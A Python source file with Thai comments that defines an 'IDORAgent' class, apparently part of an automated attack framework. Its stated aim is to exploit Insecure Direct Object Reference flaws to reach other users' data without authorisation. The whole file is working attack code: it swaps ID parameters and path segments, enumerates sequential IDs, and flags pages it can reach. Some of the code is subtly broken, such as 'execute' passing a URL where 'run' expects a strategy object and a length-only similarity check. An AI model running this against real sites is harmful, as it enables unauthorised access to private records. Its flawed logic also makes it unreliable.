"""
IDOR (Insecure Direct Object Reference) Agent
โจมตีช่องโหว่ IDOR เพื่อเข้าถึงข้อมูลของผู้ใช้อื่นโดยไม่ได้รับอนุญาต
"""
import logging
import logging

import asyncio
import re
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import aiohttp
from bs4 import BeautifulSoup

from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy
from core.logger import get_logger

log = get_logger(__name__)


class IDORAgent(BaseAgent):
    """
    Agent สำหรับโจมตีช่องโหว่ IDOR
    
    เทคนิคที่ใช้:
    - Parameter Manipulation (เปลี่ยนค่า ID, user_id, doc_id)
    - Sequential ID Enumeration (ลองเลข ID ตามลำดับ)
    - UUID/GUID Prediction (ทำนาย UUID ที่อาจใช้)
    - Path Traversal (ลองเข้าถึง path อื่น)
    - Cookie/Token Manipulation (เปลี่ยนค่าใน Cookie หรือ Token)
    """
    
    def __init__(self):
        super().__init__()
        self.name = "IDORAgent"
        self.description = "โจมตีช่องโหว่ IDOR เพื่อเข้าถึงข้อมูลที่ไม่ได้รับอนุญาต"
        
        # รายการ parameter ที่มักเป็นช่องโหว่ IDOR
        self.idor_parameters = [
            'id', 'user_id', 'userid', 'user', 'uid',
            'doc_id', 'document_id', 'file_id', 'fileid',
            'order_id', 'orderid', 'invoice_id', 'invoiceid',
            'account_id', 'accountid', 'profile_id', 'profileid',
            'post_id', 'postid', 'article_id', 'articleid',
            'page_id', 'pageid', 'item_id', 'itemid'
        ]
        
        # รูปแบบ URL ที่มักเป็นช่องโหว่
        self.idor_patterns = [
            r'/user/(\d+)',
            r'/profile/(\d+)',
            r'/document/(\d+)',
            r'/file/(\d+)',
            r'/order/(\d+)',
            r'/invoice/(\d+)',
            r'/api/user/(\d+)',
            r'/api/v\d+/user/(\d+)'
        ]
    
    async def run(self, strategy: Strategy) -> AgentData:
        """โจมตีช่องโหว่ IDOR"""
        
        log.phase(f"🎯 เริ่มโจมตี IDOR: {strategy.directive}")
        
        target_url = await self.context_manager.get_context("target_url")
        if not target_url:
            return AgentData(
                agent_name=self.name,
                success=False,
                errors=["ไม่พบ target_url ใน context"]
            )
        
        # รวบรวม URLs ที่จะทดสอบ
        urls_to_test = await self._collect_urls(target_url)
        
        # ทดสอบแต่ละ URL
        vulnerabilities = []
        
        for url in urls_to_test:
            vulns = await self._test_idor(url, strategy)
            vulnerabilities.extend(vulns)
        
        # สร้างรายงาน
        if vulnerabilities:
            report = self._create_report(vulnerabilities)
            
            # บันทึกช่องโหว่ที่พบใน context
            await self.context_manager.set_context("idor_vulnerabilities", vulnerabilities)
            
            return AgentData(
                agent_name=self.name,
                success=True,
                summary=f"พบช่องโหว่ IDOR {len(vulnerabilities)} จุด",
                raw_output=report,
                vulnerabilities=vulnerabilities
            )
        else:
            return AgentData(
                agent_name=self.name,
                success=True,
                summary="ไม่พบช่องโหว่ IDOR",
                raw_output="ทดสอบแล้วไม่พบช่องโหว่ IDOR"
            )
    
    async def _collect_urls(self, target_url: str) -> List[str]:
        """รวบรวม URLs ที่จะทดสอบ"""
        
        urls = set()
        
        # ดึง URLs จาก context (จาก WebCrawlerAgent)
        crawled_urls = await self.context_manager.get_context("crawled_urls")
        if crawled_urls:
            urls.update(crawled_urls)
        
        # เพิ่ม target URL
        urls.add(target_url)
        
        # กรอง URLs ที่มี pattern ที่น่าสนใจ
        filtered_urls = []
        for url in urls:
            if self._is_interesting_url(url):
                filtered_urls.append(url)
        
        log.info(f"พบ {len(filtered_urls)} URLs ที่จะทดสอบ IDOR")
        
        return filtered_urls
    
    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute idor agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _is_interesting_url(self, url: str) -> bool:
        """ตรวจสอบว่า URL น่าสนใจสำหรับ IDOR หรือไม่"""
        
        # ตรวจสอบว่ามี parameter ที่น่าสนใจหรือไม่
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params.keys():
            if param.lower() in self.idor_parameters:
                return True
        
        # ตรวจสอบว่า path ตรงกับ pattern หรือไม่
        for pattern in self.idor_patterns:
            if re.search(pattern, url):
                return True
        
        return False
    
    async def _test_idor(self, url: str, strategy: Strategy) -> List[Dict[str, Any]]:
        """ทดสอบ IDOR บน URL"""
        
        vulnerabilities = []
        
        # ทดสอบ Parameter Manipulation
        param_vulns = await self._test_parameter_manipulation(url, strategy)
        vulnerabilities.extend(param_vulns)
        
        # ทดสอบ Path Manipulation
        path_vulns = await self._test_path_manipulation(url, strategy)
        vulnerabilities.extend(path_vulns)
        
        # ทดสอบ Sequential ID Enumeration
        enum_vulns = await self._test_id_enumeration(url, strategy)
        vulnerabilities.extend(enum_vulns)
        
        return vulnerabilities
    
    async def _test_parameter_manipulation(self, url: str, strategy: Strategy) -> List[Dict[str, Any]]:
        """ทดสอบการเปลี่ยนค่า parameter"""
        
        vulnerabilities = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # ทดสอบแต่ละ parameter
        for param_name, param_values in params.items():
            if param_name.lower() not in self.idor_parameters:
                continue
            
            original_value = param_values[0]
            
            # ลองเปลี่ยนค่า
            test_values = self._generate_test_values(original_value)
            
            for test_value in test_values:
                # สร้าง URL ใหม่
                new_params = params.copy()
                new_params[param_name] = [test_value]
                
                new_query = urlencode(new_params, doseq=True)
                new_url = urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    new_query,
                    parsed.fragment
                ))
                
                # ทดสอบ
                is_vuln, details = await self._check_idor_vulnerability(url, new_url)
                
                if is_vuln:
                    vulnerabilities.append({
                        "type": "IDOR",
                        "method": "Parameter Manipulation",
                        "url": url,
                        "parameter": param_name,
                        "original_value": original_value,
                        "test_value": test_value,
                        "vulnerable_url": new_url,
                        "severity": "High",
                        "details": details
                    })
                    
                    log.success(f"✅ พบช่องโหว่ IDOR: {param_name}={test_value}")
        
        return vulnerabilities
    
    async def _test_path_manipulation(self, url: str, strategy: Strategy) -> List[Dict[str, Any]]:
        """ทดสอบการเปลี่ยน path"""
        
        vulnerabilities = []
        parsed = urlparse(url)
        
        # หา ID ใน path
        for pattern in self.idor_patterns:
            match = re.search(pattern, url)
            if match:
                original_id = match.group(1)
                
                # ลองเปลี่ยน ID
                test_ids = self._generate_test_values(original_id)
                
                for test_id in test_ids:
                    new_url = url.replace(f"/{original_id}", f"/{test_id}")
                    
                    # ทดสอบ
                    is_vuln, details = await self._check_idor_vulnerability(url, new_url)
                    
                    if is_vuln:
                        vulnerabilities.append({
                            "type": "IDOR",
                            "method": "Path Manipulation",
                            "url": url,
                            "original_id": original_id,
                            "test_id": test_id,
                            "vulnerable_url": new_url,
                            "severity": "High",
                            "details": details
                        })
                        
                        log.success(f"✅ พบช่องโหว่ IDOR: /{test_id}")
        
        return vulnerabilities
    
    async def _test_id_enumeration(self, url: str, strategy: Strategy) -> List[Dict[str, Any]]:
        """ทดสอบการ enumerate ID"""
        
        vulnerabilities = []
        
        # จำกัดจำนวนการทดสอบเพื่อไม่ให้ใช้เวลานาน
        max_tests = strategy.context.get("max_enum_tests", 10)
        
        # หา ID ปัจจุบัน
        current_id = self._extract_id_from_url(url)
        if not current_id:
            return vulnerabilities
        
        # ลอง enumerate
        try:
            current_id_int = int(current_id)
            
            accessible_ids = []
            
            for i in range(1, max_tests + 1):
                test_id = current_id_int + i
                test_url = url.replace(str(current_id), str(test_id))
                
                is_accessible = await self._check_accessibility(test_url)
                
                if is_accessible:
                    accessible_ids.append(test_id)
            
            if len(accessible_ids) >= 2:
                vulnerabilities.append({
                    "type": "IDOR",
                    "method": "ID Enumeration",
                    "url": url,
                    "current_id": current_id,
                    "accessible_ids": accessible_ids,
                    "severity": "High",
                    "details": f"สามารถ enumerate ID ได้ {len(accessible_ids)} IDs"
                })
                
                log.success(f"✅ พบช่องโหว่ IDOR Enumeration: {len(accessible_ids)} IDs")
        
        except ValueError:
            logging.error("Error occurred")
        
        return vulnerabilities
    
    def _generate_test_values(self, original_value: str) -> List[str]:
        """สร้างค่าสำหรับทดสอบ"""
        
        test_values = []
        
        try:
            # ถ้าเป็นตัวเลข
            original_int = int(original_value)
            
            # ลองเลขใกล้เคียง
            test_values.extend([
                str(original_int - 1),
                str(original_int + 1),
                str(original_int - 10),
                str(original_int + 10),
                "1",
                "2",
                "100",
                "999"
            ])
        
        except ValueError:
            # ถ้าไม่ใช่ตัวเลข ลองค่าทั่วไป
            test_values.extend([
                "1",
                "2",
                "admin",
                "test",
                "user"
            ])
        
        return test_values
    
    def _extract_id_from_url(self, url: str) -> str:
        """ดึง ID จาก URL"""
        
        # ลอง extract จาก parameter
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param_name in self.idor_parameters:
            if param_name in params:
                return params[param_name][0]
        
        # ลอง extract จาก path
        for pattern in self.idor_patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        return None
    
    async def _check_idor_vulnerability(self, original_url: str, test_url: str) -> tuple[bool, str]:
        """ตรวจสอบว่าเป็นช่องโหว่ IDOR หรือไม่"""
        
        try:
            async with aiohttp.ClientSession() as session:
                # ดึงข้อมูลจาก URL เดิม
                async with session.get(original_url, timeout=10) as original_resp:
                    original_status = original_resp.status
                    original_content = await original_resp.text()
                    original_length = len(original_content)
                
                # ดึงข้อมูลจาก URL ทดสอบ
                async with session.get(test_url, timeout=10) as test_resp:
                    test_status = test_resp.status
                    test_content = await test_resp.text()
                    test_length = len(test_content)
                
                # ตรวจสอบว่าเข้าถึงได้และมีข้อมูลต่างกัน
                if test_status == 200 and test_length > 0:
                    # ตรวจสอบว่าเนื้อหาต่างกันหรือไม่
                    similarity = self._calculate_similarity(original_content, test_content)
                    
                    if similarity < 0.9:  # เนื้อหาต่างกันมากกว่า 10%
                        return True, f"เข้าถึงข้อมูลต่างกันได้ (similarity: {similarity:.2f})"
                
                return False, ""
        
        except Exception as e:
            log.debug(f"ข้อผิดพลาดในการทดสอบ: {e}")
            return False, ""
    
    async def _check_accessibility(self, url: str) -> bool:
        """ตรวจสอบว่าเข้าถึง URL ได้หรือไม่"""
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as resp:
                    return resp.status == 200
        except Exception:
            return False
    
    def _calculate_similarity(self, content1: str, content2: str) -> float:
        """คำนวณความคล้ายคลึงของเนื้อหา"""
        
        # ใช้วิธีง่ายๆ โดยเปรียบเทียบความยาว
        len1 = len(content1)
        len2 = len(content2)
        
        if len1 == 0 and len2 == 0:
            return 1.0
        
        if len1 == 0 or len2 == 0:
            return 0.0
        
        # คำนวณ ratio
        ratio = min(len1, len2) / max(len1, len2)
        
        return ratio
    
    def _create_report(self, vulnerabilities: List[Dict[str, Any]]) -> str:
        """สร้างรายงาน"""
        
        report = f"=== IDOR Vulnerability Report ===\n\n"
        report += f"พบช่องโหว่ IDOR ทั้งหมด: {len(vulnerabilities)} จุด\n\n"
        
        for i, vuln in enumerate(vulnerabilities, 1):
            report += f"{i}. {vuln['method']}\n"
            report += f"   URL: {vuln['url']}\n"
            report += f"   Severity: {vuln['severity']}\n"
            report += f"   Details: {vuln['details']}\n\n"
        
        return report
    
    def validate_strategy(self, strategy: Strategy) -> bool:
        """ตรวจสอบ Strategy"""
        return True

